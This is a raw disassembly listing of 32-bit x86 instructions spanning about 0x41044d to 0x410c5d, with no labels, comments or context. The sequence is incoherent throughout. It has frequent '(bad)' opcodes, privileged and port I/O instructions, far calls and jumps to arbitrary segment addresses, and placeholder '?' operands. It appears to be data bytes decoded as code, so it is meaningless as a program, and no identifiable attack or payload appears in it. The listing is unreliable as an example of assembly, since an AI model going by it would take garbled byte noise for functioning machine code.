  41044d:	ficom  WORD PTR [eax]
  41044f:	push   0xe0b802ec
  410454:	jbe    0x410435
  410456:	xor    cl,BYTE PTR [ebx+0x43caa250]
  41045c:	sub    BYTE PTR [edx+eiz*4-0xaf23958],cl
  410463:	sub    DWORD PTR [eax-0x9],ebx
  410466:	dec    edi
  410467:	dec    eax
  410468:	pop    eax
  410469:	hlt    
  41046a:	xchg   ecx,eax
  41046b:	call   0xb1b7:0x84581a1f
  410472:	xchg   edi,eax
  410473:	xor    al,0x7d
  410475:	fwait
  410476:	xor    DWORD PTR [eax-0x26],0x37
  41047a:	xchg   BYTE PTR [esi-0x64],ah
  41047d:	and    al,al
  41047f:	aad    0x3a
  410481:	pop    es
  410482:	fiadd  WORD PTR [esi+eax*2+0x7d7547f0]
  410489:	loope  0x410483
  41048b:	pop    edx
  41048c:	sahf   
  41048d:	fld    TBYTE PTR [ebp+ebp*8-0x26]
  410491:	rcl    DWORD PTR [ebx+0x47e339e1],0x60
  410498:	cmp    DWORD PTR [ebx-0x66],esi
  41049b:	ins    BYTE PTR es:[edi],dx
  41049c:	data16 mov cl,0x61
  41049f:	and    al,0x7e
  4104a1:	mov    bh,0xa4
  4104a3:	aaa    
  4104a4:	mov    al,BYTE PTR [edi]
  4104a6:	(bad)  
  4104a7:	dec    eax
  4104a8:	div    DWORD PTR [eax+0x34ba35aa]
  4104ae:	in     eax,dx
  4104af:	lea    eax,[esi-0x6f48a844]
  4104b5:	dec    esp
  4104b6:	rcl    BYTE PTR [ecx-0x697c6750],0x57
  4104bd:	xor    dh,BYTE PTR [eax+0xb]
  4104c0:	aad    0xd5
  4104c2:	xchg   al,cl
  4104c4:	push   esp
  4104c5:	xor    BYTE PTR [ebx+ebp*1],dl
  4104c8:	adc    eax,0x81d25296
  4104cd:	fbstp  TBYTE PTR [edx+ecx*1]
  4104d0:	cmp    DWORD PTR [ebp-0x5f],edi
  4104d3:	das    
  4104d4:	call   0x2bc:0x4a686522
  4104db:	lock pop esp
  4104dd:	or     eax,0x108d7213
  4104e2:	cmc    
  4104e3:	cmp    eax,0xa340b5da
  4104e8:	scas   eax,DWORD PTR es:[edi]
  4104e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104ea:	mov    esp,DWORD PTR [edx]
  4104ec:	lods   al,BYTE PTR ds:[esi]
  4104ed:	mov    esi,0x65468f0c
  4104f2:	int    0xbb
  4104f4:	mov    ebx,0xf44ba84
  4104f9:	push   edi
  4104fa:	pushf  
  4104fb:	pop    esi
  4104fc:	ins    DWORD PTR es:[edi],dx
  4104fd:	(bad)  
  4104fe:	xor    eax,0x852a4d07
  410503:	je     0x4104ef
  410505:	mov    ah,0xfb
  410507:	and    eax,0x719ff70a
  41050c:	jnp    0x410589
  41050e:	int3   
  41050f:	adc    BYTE PTR [eax],cl
  410511:	xchg   ecx,eax
  410512:	lock jnp 0x410533
  410515:	cmp    BYTE PTR [edx+0x55],al
  410518:	fld    DWORD PTR [eax]
  41051a:	daa    
  41051b:	cli    
  41051c:	sahf   
  41051d:	and    ebp,DWORD PTR [ebp+0x5e]
  410520:	mov    bh,0xcf
  410522:	scas   al,BYTE PTR es:[edi]
  410523:	jo     0x4104e4
  410525:	pop    ebp
  410526:	dec    BYTE PTR [esi+0xb550c1f]
  41052c:	jmp    0x410587
  41052e:	das    
  41052f:	pop    edi
  410530:	ret    0x2edb
  410533:	mov    eax,0x6de7e2b6
  410538:	les    esi,FWORD PTR [edi-0x75b1ef07]
  41053e:	ja     0x4104ec
  410540:	int3   
  410541:	(bad)  
  410542:	icebp  
  410543:	imul   DWORD PTR [ebp-0x7c]
  410546:	shl    eax,1
  410548:	sti    
  410549:	dec    ecx
  41054a:	cwde   
  41054b:	call   0xcf8f:0x9ab351c4
  410552:	add    ebp,DWORD PTR [edi]
  410554:	aaa    
  410555:	int    0xb5
  410557:	fmulp  st(3),st
  410559:	jno    0x410578
  41055b:	in     al,0xfc
  41055d:	sub    eax,edx
  41055f:	sub    BYTE PTR [eax-0x3d3816d2],al
  410565:	sbb    DWORD PTR [edi-0x131a3c85],edx
  41056b:	and    al,0x4f
  41056d:	call   0x4c82:0x5cf5a4e7
  410574:	cmp    eax,0x8dc79992
  410579:	fidiv  WORD PTR [ecx-0x70466261]
  41057f:	cmp    BYTE PTR [esi+0x2],ch
  410582:	daa    
  410583:	das    
  410584:	xor    al,BYTE PTR [ebx-0x76]
  410587:	test   DWORD PTR [ecx-0x69bbe1d7],ecx
  41058d:	fcom   st(1)
  41058f:	sbb    edx,DWORD PTR [ebp-0x43dc5a0b]
  410595:	mov    esi,0xfcfe3276
  41059a:	mov    eax,?
  41059c:	cdq    
  41059d:	pop    ds
  41059e:	push   ebx
  41059f:	pop    esp
  4105a0:	xchg   esi,esp
  4105a2:	add    DWORD PTR [edx+0x251eeaf4],eax
  4105a8:	data16 jo 0x410610
  4105ab:	fs mov ebp,0xcd57cd59
  4105b1:	sbb    eax,0x1b753e56
  4105b6:	mov    ds:0x640edcdf,al
  4105bb:	call   0x5593f31d
  4105c0:	xchg   edi,eax
  4105c1:	mov    ecx,0xd50f1d12
  4105c6:	in     al,0x7f
  4105c8:	push   esp
  4105c9:	mov    WORD PTR [eax],fs
  4105cb:	lds    ebp,FWORD PTR [ecx]
  4105cd:	push   es
  4105ce:	sti    
  4105cf:	out    0xb9,al
  4105d1:	cmp    ch,BYTE PTR ds:0xad0a17a4
  4105d7:	xor    ah,dl
  4105d9:	mov    dl,0x3b
  4105db:	fcomp  QWORD PTR [ebx+0x2c]
  4105de:	jecxz  0x4105e7
  4105e0:	mov    eax,0x1444bc0c
  4105e5:	hlt    
  4105e6:	xchg   ecx,eax
  4105e7:	add    esp,edx
  4105e9:	out    0x81,al
  4105eb:	mov    ds:0xff056e68,eax
  4105f0:	fwait
  4105f1:	in     al,dx
  4105f2:	push   edx
  4105f3:	dec    ebp
  4105f4:	lods   al,BYTE PTR ds:[esi]
  4105f5:	pop    ss
  4105f6:	xor    DWORD PTR [edx+ebp*1-0xccb5502],edx
  4105fd:	shl    BYTE PTR [esp+eiz*2-0x7e],1
  410601:	lods   al,BYTE PTR ds:[esi]
  410602:	push   ds
  410603:	test   al,0xf4
  410605:	add    cl,al
  410607:	popf   
  410608:	pushf  
  410609:	inc    ebx
  41060a:	sbb    BYTE PTR [edx-0x21],bl
  41060d:	jo     0x4105d2
  41060f:	pop    ss
  410610:	les    edx,FWORD PTR [edx]
  410612:	mov    al,ds:0xc422b87e
  410617:	(bad)
  41061b:	cmc    
  41061c:	les    ebp,FWORD PTR [ecx]
  41061e:	push   esp
  41061f:	outs   dx,DWORD PTR ds:[esi]
  410620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410621:	shl    BYTE PTR ds:0x6690f33a,0x68
  410628:	leave  
  410629:	imul   edi,DWORD PTR [esi+0x6b715838],0x54
  410630:	clc    
  410631:	mov    esp,0xcd93a85
  410636:	sub    al,0x3c
  410638:	shr    BYTE PTR [edx+0x71],0x56
  41063c:	adc    edi,edi
  41063e:	adc    eax,0xdaef410d
  410643:	sub    eax,0xf613c68b
  410648:	repz iret 
  41064a:	dec    esi
  41064b:	pusha  
  41064c:	sti    
  41064d:	push   ebp
  41064e:	cli    
  41064f:	mov    al,ds:0x8656794f
  410654:	js     0x4105fe
  410656:	hlt    
  410657:	cld    
  410658:	sub    BYTE PTR [ebx],0x51
  41065b:	in     al,0xbe
  41065d:	fwait
  41065e:	mov    dl,0x11
  410660:	xchg   esp,eax
  410661:	mov    ds:0x83ce6bba,eax
  410666:	(bad)  
  410667:	shl    BYTE PTR [eax+0x20],1
  41066a:	push   ebx
  41066b:	int3   
  41066c:	out    0x44,al
  41066e:	mov    bl,0xe0
  410670:	in     eax,0xd3
  410672:	or     BYTE PTR [ebx+0x53],cl
  410675:	icebp  
  410676:	jge    0x4106ed
  410678:	test   BYTE PTR [ecx+eiz*8],dl
  41067b:	xor    DWORD PTR [esi],0x35
  41067e:	push   ebp
  41067f:	into   
  410680:	and    eax,0xbf2329b7
  410685:	add    eax,0x3883324a
  41068a:	mov    esi,0x2603fb1d
  41068f:	gs dec eax
  410691:	jge    0x4106d6
  410693:	inc    ecx
  410694:	xor    ecx,0x6d
  410697:	iret   
  410698:	mov    esi,0x83de378f
  41069d:	scas   al,BYTE PTR es:[edi]
  41069e:	sub    BYTE PTR [ecx+0x32],bh
  4106a1:	in     al,0x28
  4106a3:	push   edx
  4106a4:	jg     0x410680
  4106a6:	mov    esi,0xc6f17c0e
  4106ab:	push   eax
  4106ac:	inc    esi
  4106ad:	stos   BYTE PTR es:[edi],al
  4106ae:	out    0x8b,eax
  4106b0:	xchg   esi,eax
  4106b1:	jbe    0x4106b6
  4106b3:	or     DWORD PTR ds:0xd6bb659a,ebx
  4106b9:	icebp  
  4106ba:	jmp    0x9898ca07
  4106bf:	or     eax,0x20610e9d
  4106c4:	pushf  
  4106c5:	jmp    0xb45b:0xaa03f21b
  4106cc:	mov    bh,0xeb
  4106ce:	or     eax,DWORD PTR [ebp+0x545270d8]
  4106d4:	push   eax
  4106d5:	(bad)  
  4106d6:	test   DWORD PTR [ecx-0x69b97544],esi
  4106dc:	ins    DWORD PTR es:[edi],dx
  4106dd:	add    ecx,DWORD PTR [ebp-0x31ad12a7]
  4106e3:	arpl   si,bx
  4106e5:	xchg   esp,eax
  4106e6:	mov    ds:0x72f4478c,eax
  4106eb:	out    dx,eax
  4106ec:	xchg   BYTE PTR [esi],ch
  4106ee:	mov    ch,0x73
  4106f0:	mov    ecx,0xc0df34d1
  4106f5:	jae    0x410733
  4106f7:	pop    ebp
  4106f8:	ret    0xaea9
  4106fb:	mov    ebx,0xfe854b45
  410700:	imul   esi,DWORD PTR [ebx-0x7],0xf3d5d718
  410707:	add    eax,0x15ec5577
  41070c:	scas   eax,DWORD PTR es:[edi]
  41070d:	sbb    DWORD PTR [eax],eax
  41070f:	out    0x9f,al
  410711:	mov    bh,0xb3
  410713:	mov    ebx,0x23994c7f
  410718:	dec    ebx
  410719:	arpl   WORD PTR [ebx+0x38dff64a],di
  41071f:	push   0x55
  410721:	stos   DWORD PTR es:[edi],eax
  410722:	sahf   
  410723:	mov    ds:0x4273a8a2,eax
  410728:	imul   ebp,DWORD PTR [ecx+0x67],0xfffffff3
  41072c:	or     DWORD PTR [ebx],eax
  41072e:	xor    ecx,0x67e021e3
  410734:	jnp    0x4106c0
  410736:	xchg   BYTE PTR [edi+0x64],ch
  410739:	cdq    
  41073a:	dec    esp
  41073b:	ret    0x6551
  41073e:	inc    esp
  41073f:	jns    0x410733
  410741:	add    al,0x5b
  410743:	sub    esp,esi
  410745:	test   DWORD PTR [edx],0xa7ecd04b
  41074b:	not    DWORD PTR [eax+esi*4]
  41074e:	dec    edx
  41074f:	enter  0x9633,0x6d
  410753:	sahf   
  410754:	inc    eax
  410755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410756:	fist   DWORD PTR [edi+0x68f1ce89]
  41075c:	xchg   edx,eax
  41075d:	push   esi
  41075e:	xor    al,0xa2
  410760:	call   0x3005:0x13848a64
  410767:	fistp  WORD PTR [edx-0x734a1603]
  41076d:	push   ss
  41076e:	hlt    
  41076f:	test   BYTE PTR [edi],cl
  410771:	loop   0x4106fd
  410773:	mov    esp,0xed320ca2
  410778:	mov    bl,0xa4
  41077a:	xor    eax,0xb4739ec
  41077f:	in     eax,dx
  410780:	ins    DWORD PTR es:[edi],dx
  410781:	mov    DWORD PTR [ecx+edi*2],0xf59a26c1
  410788:	in     eax,0x3
  41078a:	mov    al,ds:0x45318187
  41078f:	add    dl,ah
  410791:	outs   dx,BYTE PTR ds:[esi]
  410792:	add    BYTE PTR [edx+eax*1],bl
  410795:	sar    DWORD PTR [ecx+0x24],0x5b
  410799:	retf   0xa4fc
  41079c:	inc    esp
  41079d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41079e:	fistp  WORD PTR [eax]
  4107a0:	ret    0x65b8
  4107a3:	jbe    0x410820
  4107a5:	rol    DWORD PTR [ebp-0x58],0x93
  4107a9:	jmp    0x7bac:0xda5f455
  4107b0:	fcomp  st(6)
  4107b2:	sub    edi,0x10
  4107b5:	das    
  4107b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107b7:	jne    0x410746
  4107b9:	and    BYTE PTR [esi+0x57],cl
  4107bc:	or     ah,cl
  4107be:	cmp    DWORD PTR [edx+eiz*4-0x7df81183],edx
  4107c5:	sub    DWORD PTR [eax+0x33],edi
  4107c8:	mov    DWORD PTR [eax],edx
  4107ca:	push   eax
  4107cb:	add    al,0xbc
  4107cd:	and    eax,0xe43308d0
  4107d2:	imul   eax,esp,0x69d36988
  4107d8:	xchg   BYTE PTR [esi-0x14c9aec5],bl
  4107de:	sti    
  4107df:	mov    eax,ds:0xb14c3613
  4107e4:	mov    ebp,0xe05d50f4
  4107e9:	adc    ah,dl
  4107eb:	les    esi,FWORD PTR [edi+0x482ad657]
  4107f1:	xor    al,0x70
  4107f3:	loop   0x4107b4
  4107f5:	iret   
  4107f6:	mov    ebx,0xe6bfe798
  4107fb:	ins    BYTE PTR es:[edi],dx
  4107fc:	test   BYTE PTR [esi],dh
  4107fe:	lods   eax,DWORD PTR ds:[esi]
  4107ff:	out    dx,eax
  410800:	add    BYTE PTR [edi+0x4c],ch
  410803:	mov    ebx,0xd7c82cdf
  410808:	or     BYTE PTR [ebx-0x2f4b3055],bl
  41080e:	imul   edi,DWORD PTR [esp+edx*1+0x52a931d1],0xffffffc2
  410816:	cwde   
  410817:	cli    
  410818:	jns    0x410894
  41081a:	pushf  
  41081b:	scas   eax,DWORD PTR es:[edi]
  41081c:	xor    BYTE PTR [ebx],0x75
  41081f:	(bad)  
  410820:	sbb    al,0xca
  410822:	dec    edx
  410823:	mov    ebx,0xfd59d918
  410828:	mov    DWORD PTR [edi-0x7a],0x9bc52c8c
  41082f:	push   ds
  410830:	pop    eax
  410831:	lahf   
  410832:	jmp    0x7e7a:0xe2c9af66
  410839:	out    dx,al
  41083a:	and    eax,0xe6ec17
  41083f:	(bad)  
  410841:	leave  
  410842:	mov    al,ds:0xa49e0dca
  410847:	push   0x1ed51ff
  41084c:	add    BYTE PTR [ebx+0x1c],ch
  41084f:	retf   
  410850:	jmp    0x63a1:0xc1b973f
  410857:	xor    bl,BYTE PTR [edi]
  410859:	test   eax,0x58fcec7
  41085e:	cmc    
  41085f:	lods   al,BYTE PTR ds:[esi]
  410860:	xor    DWORD PTR es:[ebp-0x4768ca82],ebp
  410867:	xor    ecx,ebx
  410869:	pop    edx
  41086a:	push   edi
  41086b:	pop    esi
  41086c:	sar    DWORD PTR [ebp-0x259d215],1
  410872:	jo     0x410814
  410874:	rcl    bh,cl
  410876:	bound  eax,QWORD PTR [edi-0x79c49e70]
  41087c:	pushf  
  41087d:	mov    cl,0xad
  41087f:	mov    esp,ecx
  410881:	cs adc ebx,esp
  410884:	out    0x5e,eax
  410886:	push   ebp
  410887:	out    0xc,eax
  410889:	lock jnp 0x410810
  41088c:	mov    ds:0x974e6b38,al
  410891:	arpl   WORD PTR [ebx+ebx*1],si
  410894:	xor    eax,0xf00e60f2
  410899:	or     edi,esp
  41089b:	jge    0x4108e4
  41089d:	ins    BYTE PTR es:[edi],dx
  41089e:	scas   al,BYTE PTR es:[edi]
  41089f:	stc    
  4108a0:	in     eax,0xf0
  4108a2:	fcmovnu st,st(4)
  4108a4:	xchg   DWORD PTR [ebp-0x1d43411b],edi
  4108aa:	mov    bl,0x93
  4108ac:	outs   dx,BYTE PTR ds:[esi]
  4108ad:	push   edi
  4108ae:	inc    ecx
  4108af:	add    bl,ch
  4108b1:	mov    ?,ebp
  4108b3:	jl     0x4108c2
  4108b5:	mov    eax,0x436d26c8
  4108ba:	icebp  
  4108bb:	cs push esp
  4108bd:	and    bl,BYTE PTR [ebx-0x5]
  4108c0:	(bad)  
  4108c1:	outs   dx,BYTE PTR ds:[esi]
  4108c2:	in     eax,dx
  4108c3:	test   BYTE PTR [edx+0x5a5ce815],dh
  4108c9:	aaa    
  4108ca:	loop   0x410900
  4108cc:	test   DWORD PTR [edi-0x11],0xfae991a2
  4108d3:	xor    BYTE PTR [esi],ah
  4108d5:	retf   
  4108d6:	scas   eax,DWORD PTR es:[edi]
  4108d7:	add    ebx,DWORD PTR [ebx+0x70e7296a]
  4108dd:	fwait
  4108de:	pop    esi
  4108df:	sub    ecx,DWORD PTR [ebx+edx*2]
  4108e2:	out    0xa9,al
  4108e4:	push   ecx
  4108e5:	adc    al,0xc6
  4108e7:	pop    ebp
  4108e8:	fild   DWORD PTR [edx-0x5fdac5f1]
  4108ee:	and    eax,0x4a9c92
  4108f3:	push   edx
  4108f4:	je     0x4108c1
  4108f6:	push   esp
  4108f7:	call   0x8938:0x802181c6
  4108fe:	pop    esi
  4108ff:	imul   edi,DWORD PTR [ebx+0x2c],0x4a
  410903:	pop    eax
  410904:	mov    ah,0x1
  410906:	nop
  410907:	push   esi
  410908:	idiv   esi
  41090a:	(bad)  
  41090b:	sbb    BYTE PTR cs:[ecx+0x3cdd0b7d],0x9d
  410913:	les    esi,FWORD PTR [ecx+0xd]
  410916:	int    0x9b
  410918:	sbb    ch,BYTE PTR [eax+0xe]
  41091b:	mov    ds:0xfbdf4fe7,eax
  410920:	adc    eax,ebx
  410922:	dec    edi
  410923:	stos   BYTE PTR es:[edi],al
  410924:	pop    ebp
  410925:	jge    0x410998
  410927:	shl    BYTE PTR [ecx-0x16],cl
  41092a:	arpl   WORD PTR [edx-0x3e2fcaa9],bx
  410930:	push   eax
  410931:	push   ebp
  410932:	std    
  410933:	(bad)  
  410934:	iret   
  410935:	imul   esp,eax,0xffffffb0
  410938:	loope  0x4109ad
  41093a:	shl    DWORD PTR [ebp-0x74],cl
  41093d:	(bad)  [esp+ebx*8]
  410940:	adc    bl,BYTE PTR [esi]
  410942:	dec    edi
  410943:	xchg   ebx,eax
  410944:	pop    edi
  410945:	or     eax,DWORD PTR [edi-0x20]
  410948:	dec    eax
  410949:	imul   eax,DWORD PTR [bx-0x7f],0x7
  41094e:	out    0xa,eax
  410950:	sbb    al,0x14
  410952:	adc    edi,edi
  410954:	xchg   edi,eax
  410955:	in     eax,dx
  410956:	jle    0x4109d1
  410958:	mov    ah,0xa
  41095a:	das    
  41095b:	call   0xc069:0xde7b9331
  410962:	xor    cl,BYTE PTR [ecx+ecx*2+0x1f]
  410966:	sub    eax,DWORD PTR [ecx-0x32]
  410969:	mov    bh,BYTE PTR [ebx-0x4a8577f6]
  41096f:	push   ebp
  410970:	jecxz  0x4109a0
  410972:	cmp    cl,BYTE PTR [edi+0x2c96b6e7]
  410978:	and    ch,al
  41097a:	cmc    
  41097b:	fcomp  QWORD PTR [edi+0x56]
  41097e:	sub    bh,ch
  410980:	cmp    ebp,DWORD PTR [ebx]
  410982:	and    DWORD PTR [ebp-0x52334e00],0x7
  410989:	push   0xca6fbde4
  41098e:	mov    edi,0xd67dfca9
  410993:	xchg   ecx,eax
  410994:	outs   dx,BYTE PTR ds:[esi]
  410995:	adc    al,0xb
  410997:	mov    ecx,0xb30a905d
  41099c:	dec    ecx
  41099d:	jne    0x4109c6
  41099f:	push   0x963f5937
  4109a4:	(bad)
  4109a7:	inc    edi
  4109a8:	pop    ebx
  4109a9:	jns    0x4109b9
  4109ab:	xlat   BYTE PTR ds:[ebx]
  4109ac:	lahf   
  4109ad:	pop    edx
  4109ae:	add    cl,0x81
  4109b1:	push   cs
  4109b2:	jb     0x410a10
  4109b4:	xor    al,0x7b
  4109b6:	fist   WORD PTR ss:[ebx-0x27201e6]
  4109bd:	xor    eax,0x7588737b
  4109c2:	dec    esi
  4109c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109c4:	std    
  4109c5:	xchg   ebx,eax
  4109c6:	dec    eax
  4109c7:	cmp    DWORD PTR [eax-0x483ce8de],ecx
  4109cd:	or     BYTE PTR [edx-0x106d2eca],0xd2
  4109d4:	cmc    
  4109d5:	push   ss
  4109d6:	cmp    DWORD PTR [edx-0x5f],ebp
  4109d9:	into   
  4109da:	lds    edi,FWORD PTR [ebp+0x197ee409]
  4109e0:	jp     0x41099e
  4109e2:	pop    ebx
  4109e3:	mov    al,ds:0xebc8dca9
  4109e8:	sar    esp,cl
  4109ea:	pop    ds
  4109eb:	or     BYTE PTR [ecx+0x59],bh
  4109ee:	in     eax,0x7e
  4109f0:	push   cs
  4109f1:	pop    ecx
  4109f2:	cdq    
  4109f3:	retf   
  4109f4:	sahf   
  4109f5:	dec    edx
  4109f6:	xchg   esp,eax
  4109f7:	call   0x63b1:0x60a36b
  4109fe:	adc    al,0xc3
  410a00:	sub    al,0xef
  410a02:	les    eax,FWORD PTR [eax-0x4]
  410a05:	cli    
  410a06:	arpl   di,bp
  410a08:	xchg   ecx,eax
  410a09:	es jae 0x4109f8
  410a0c:	dec    ebx
  410a0d:	mov    bh,0xd7
  410a0f:	js     0x410a89
  410a11:	and    al,0x12
  410a13:	je     0x410a04
  410a15:	cmp    DWORD PTR [esp+edi*8-0x818722c],eax
  410a1c:	or     dh,0xcc
  410a1f:	push   cs
  410a20:	or     DWORD PTR [esi-0x7e18858],0x9df11652
  410a2a:	mov    ecx,DWORD PTR [edx+0x3f]
  410a2d:	popa   
  410a2e:	push   ebx
  410a30:	fdiv   DWORD PTR [edx+0x12]
  410a33:	lock das 
  410a35:	call   0x2847353f
  410a3a:	aad    0x77
  410a3c:	shr    dl,cl
  410a3e:	inc    edi
  410a3f:	test   BYTE PTR [ecx-0x15630bca],bl
  410a45:	pop    ecx
  410a46:	and    eax,0xb8aa348c
  410a4b:	aad    0xb5
  410a4d:	adc    DWORD PTR [ecx],esi
  410a4f:	cmp    eax,0xd1d0c9d3
  410a54:	pop    es
  410a55:	pusha  
  410a56:	sub    ch,BYTE PTR [eax]
  410a58:	add    al,cl
  410a5a:	and    esi,esp
  410a5c:	mov    DWORD PTR [edi-0x6b1a7ad8],ecx
  410a62:	out    dx,al
  410a63:	adc    ch,ah
  410a65:	pusha  
  410a66:	jmp    0xd3f6ef0a
  410a6b:	ins    BYTE PTR es:[edi],dx
  410a6c:	xor    al,0x8d
  410a6e:	in     al,0x39
  410a70:	mov    ds:0x409eed28,eax
  410a75:	sar    BYTE PTR [ebx-0x10cf4542],0xc4
  410a7c:	adc    DWORD PTR [ebp+0x5ddeda18],ebp
  410a82:	sub    DWORD PTR [eax+eax*2+0x4],edi
  410a86:	fcmove st,st(2)
  410a88:	xchg   ecx,eax
  410a89:	jo     0x410aa2
  410a8b:	push   edx
  410a8c:	cmp    al,0x60
  410a8e:	out    dx,eax
  410a8f:	mul    bh
  410a91:	xchg   esi,eax
  410a92:	ret    
  410a93:	add    cl,cl
  410a95:	test   al,0x3
  410a97:	scas   al,BYTE PTR es:[edi]
  410a98:	push   ecx
  410a99:	xor    al,0x2e
  410a9b:	daa    
  410a9c:	(bad)  
  410a9d:	jo     0x410a1f
  410a9f:	xlat   BYTE PTR ds:[ebx]
  410aa0:	retf   0x98a9
  410aa3:	ss out dx,eax
  410aa5:	mov    bl,0x7e
  410aa7:	call   0x6b2cf424
  410aac:	adc    ch,BYTE PTR [eax-0x4f7757f]
  410ab2:	leave  
  410ab3:	les    ebp,FWORD PTR [esi]
  410ab5:	repnz bound ebp,QWORD PTR [edx+0x2fcd72a8]
  410abc:	jmp    0xdd65399b
  410ac1:	aas    
  410ac2:	ins    BYTE PTR es:[edi],dx
  410ac3:	push   ebx
  410ac4:	push   es
  410ac5:	inc    BYTE PTR [esi+edx*4]
  410ac8:	ins    BYTE PTR es:[edi],dx
  410ac9:	jge    0x410aca
  410acb:	jl     0x410a6a
  410acd:	mov    ch,0x5e
  410acf:	cmp    eax,0xb56a423e
  410ad4:	pop    ebx
  410ad5:	stc    
  410ad6:	cdq    
  410ad7:	xchg   esp,eax
  410ad8:	and    dl,BYTE PTR [esi+ebx*1+0x24]
  410adc:	test   BYTE PTR [edi],ch
  410ade:	xchg   DWORD PTR [esi-0x3eb27645],ecx
  410ae4:	mov    ds:0xbd33405d,eax
  410ae9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410aea:	lahf   
  410aeb:	inc    eax
  410aec:	sahf   
  410aed:	add    cl,al
  410aef:	pushf  
  410af0:	push   esi
  410af1:	xchg   edi,eax
  410af2:	ins    BYTE PTR es:[edi],dx
  410af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410af4:	mov    eax,0x931d227a
  410af9:	out    dx,eax
  410afa:	and    al,BYTE PTR [esi+ebp*1+0x2b6a3db1]
  410b01:	add    al,0xed
  410b03:	sub    edx,DWORD PTR [edx-0x56]
  410b06:	into   
  410b07:	aaa    
  410b08:	cmp    dh,BYTE PTR [ecx+0x4be84fec]
  410b0e:	xchg   BYTE PTR [ebx-0xb],ch
  410b11:	and    bh,BYTE PTR [edx-0x71]
  410b14:	shl    BYTE PTR [eax+0x2c887897],cl
  410b1a:	cs test al,0x4c
  410b1d:	xor    al,0xcc
  410b1f:	dec    ebx
  410b20:	mov    eax,ebp
  410b22:	call   DWORD PTR [esi+0x4e]
  410b25:	jp     0x410b43
  410b27:	call   0x2357:0x8b1d57f3
  410b2e:	jp     0x410ac5
  410b30:	sbb    bl,dl
  410b32:	ror    DWORD PTR [eax-0x23],1
  410b35:	fsub   QWORD PTR [edi]
  410b37:	pop    es
  410b38:	sbb    ecx,esp
  410b3a:	mov    es,esi
  410b3c:	dec    ebp
  410b3d:	xor    eax,0x42180b80
  410b42:	or     dh,BYTE PTR [eax]
  410b44:	add    DWORD PTR [esi],ebp
  410b46:	push   eax
  410b47:	dec    ecx
  410b48:	stos   BYTE PTR es:[edi],al
  410b49:	hlt    
  410b4a:	out    0xb5,al
  410b4c:	mov    edx,esp
  410b4e:	aad    0xe2
  410b50:	mov    esi,0xad271c04
  410b55:	test   eax,0xc1f5aa1c
  410b5a:	and    al,0x6b
  410b5c:	(bad)  [ebx]
  410b5e:	sbb    eax,0x97ed5d3a
  410b63:	dec    esi
  410b64:	adc    bl,BYTE PTR [edi+0x298feef0]
  410b6a:	push   ebx
  410b6b:	out    0xee,eax
  410b6d:	inc    edi
  410b6e:	aam    0x93
  410b70:	mov    bh,0x61
  410b72:	mov    ds:0x4711c822,al
  410b77:	aaa    
  410b78:	dec    edi
  410b79:	in     eax,dx
  410b7a:	es push edx
  410b7c:	or     eax,0x4dc14ed9
  410b81:	fst    DWORD PTR [esi]
  410b83:	mov    eax,0x850116cc
  410b88:	(bad)  
  410b89:	fiadd  DWORD PTR es:[ebx+0x1e]
  410b8d:	push   esp
  410b8e:	add    eax,0x569be938
  410b93:	stos   DWORD PTR es:[edi],eax
  410b94:	xor    DWORD PTR [esp+edi*4-0x3ff6cb68],ebp
  410b9b:	mov    al,ds:0x1d7f9f92
  410ba0:	cmp    DWORD PTR [edi-0x38f5db93],esp
  410ba6:	ret    0x5e85
  410ba9:	jge    0x410c15
  410bab:	sbb    eax,0xfbe90a12
  410bb0:	add    BYTE PTR [esi-0x35],0x21
  410bb4:	out    0x89,eax
  410bb6:	dec    ebp
  410bb7:	xor    eax,0x5fc9aaa2
  410bbc:	pop    esp
  410bbd:	push   0x6a938062
  410bc2:	inc    eax
  410bc3:	fwait
  410bc4:	pop    ebx
  410bc5:	push   ecx
  410bc6:	fiadd  WORD PTR [ebp+edi*4+0x2f]
  410bca:	xchg   esp,eax
  410bcb:	mov    cl,0x42
  410bcd:	push   0xffffffe2
  410bcf:	cmp    ecx,ecx
  410bd1:	addr16 inc ebx
  410bd3:	in     eax,0x2a
  410bd5:	icebp  
  410bd6:	xchg   esp,eax
  410bd7:	or     edx,ecx
  410bd9:	out    dx,al
  410bda:	mov    ebp,0x8c8fac9f
  410bdf:	retf   0x55d1
  410be2:	iret   
  410be3:	lahf   
  410be4:	mov    ebp,0xd726c16c
  410be9:	mov    ebx,DWORD PTR [ecx-0x1d]
  410bec:	clc    
  410bed:	and    eax,0xfeb83c89
  410bf2:	and    DWORD PTR [ecx],esp
  410bf4:	jb     0x410c3d
  410bf6:	cmp    eax,0xa98cbadb
  410bfb:	cmp    ebx,edi
  410bfd:	daa    
  410bfe:	imul   esi,DWORD PTR [esi],0x36
  410c01:	enter  0x61e0,0x6c
  410c05:	pop    ecx
  410c06:	outs   dx,DWORD PTR ds:[esi]
  410c07:	std    
  410c08:	sbb    al,0x83
  410c0a:	retf   0x1aa9
  410c0d:	inc    edi
  410c0e:	dec    ebx
  410c0f:	jecxz  0x410bf7
  410c11:	fcmove st,st(2)
  410c13:	and    BYTE PTR [edi+0x7f],dl
  410c16:	push   edi
  410c17:	icebp  
  410c18:	mov    ebp,0x2f2b533b
  410c1d:	scas   eax,DWORD PTR es:[edi]
  410c1e:	sub    al,0xa5
  410c20:	sbb    DWORD PTR [edi],0x3e
  410c23:	lahf   
  410c24:	or     eax,0xbac34f6f
  410c29:	gs das 
  410c2b:	ror    DWORD PTR [esi+0x35e02ee0],cl
  410c31:	fs xchg ebp,eax
  410c33:	inc    eax
  410c34:	push   ecx
  410c35:	mov    ds:0xe751fe89,al
  410c3a:	gs mov dl,0x13
  410c3d:	jmp    0xb034d939
  410c42:	pop    ebp
  410c43:	jmp    0x97b36b84
  410c48:	sub    bh,BYTE PTR [ebp+0x71]
  410c4b:	mov    edi,0x5b684634
  410c50:	or     eax,ebp
  410c52:	or     DWORD PTR [edx-0xe382929],eax
  410c58:	dec    ecx
  410c59:	outs   dx,DWORD PTR ds:[esi]
  410c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c5b:	jl     0x410c57
  410c5d:	imul   ebp,edi,0x10
